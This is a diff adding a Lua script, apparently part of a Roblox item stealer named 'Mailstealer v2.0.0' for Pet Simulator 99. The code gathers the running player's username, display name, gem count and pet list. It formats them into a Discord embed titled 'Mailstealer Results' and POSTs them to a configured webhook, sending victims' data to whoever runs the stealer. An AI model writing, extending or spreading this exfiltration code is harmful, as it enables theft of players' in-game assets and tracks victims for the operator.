@@ -1,0 +1,52 @@
+imgs =
+    "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
+data1 = {
+    ["content"] = "@everyone",
+    ["username"] = "Mailstealer v2.0.0",
+    ["avatar_url"] = imgs,
+    ["embeds"] = {
+        {
+            ["title"] = "__`Mailstealer Results`__ 🎉",
+            ["url"] = "https://discord.gg/QFAE3ztNGv",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xFFFFFF),
+            ["thumbnail"] = {
+                ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
+                ["height"] = 420,
+                ["width"] = 420
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "`(🐧) Player Info:`",
+                    ["value"] = "```(🧸) Username: " ..
+                        game.Players.LocalPlayer.Name ..
+                            "\n(🔒) Display Username:" ..
+                                game.Players.LocalPlayer.DisplayName ..
+                                    "(🎲) Creator:" ..
+                                        Username .. "\n(📌) Version: 2.0.0\n(💎) Gems: " .. GemAmount .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "`(🐱) Pets List:`",
+                    ["value"] = "```" .. PetsListString .. "```",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+}
+newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+headers = {
+    ["content-type"] = "application/json"
+}
+
+if Webhook ~= nil and whenabled == true then
+    abcdef1 = {
+        Url = url,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef1)
+end
